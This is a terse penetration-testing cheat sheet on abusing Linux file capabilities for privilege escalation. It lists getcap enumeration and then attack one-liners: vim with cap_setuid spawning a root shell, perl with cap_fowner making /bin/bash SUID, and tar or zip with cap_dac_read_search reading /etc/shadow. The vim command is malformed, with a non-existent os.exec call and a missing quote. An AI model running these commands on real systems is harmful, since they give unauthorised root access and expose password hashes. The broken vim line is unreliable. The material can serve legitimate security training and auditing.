# Capabilities

## Example

### 

    getcap -r / 2>/dev/null

## True Positive: cap_setuid+ep, cap_fowner+ep (This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file)

## Example:

### 1) cap_setuid+ep

    ./vim -c ':py3 import os; os.setuid(0); os.exec("/bin/sh, "sh", "-c", "reset; exec sh")' 

### 2) cap_fowner+ep

    ./perl -e 'chmod 04777, "/bin/bash";' 

### 3) cap_dac_read_search=ep

Tar

    tar -cvf shadow.tar /etc/shadow
    tar -xvf shadow.tar
    cat /etc/shadow
    
Zip

    /path/to/zip /tmp/shadow.zip /etc/shadow
    #/path/to/ is the directory of the zip file with the added capability.
    #Next, we extract that archive: 
    unzip /tmp/shadow.zip -d /tmp
    #Then, we can simply read the file: 
    cat /tmp/etc/shadow
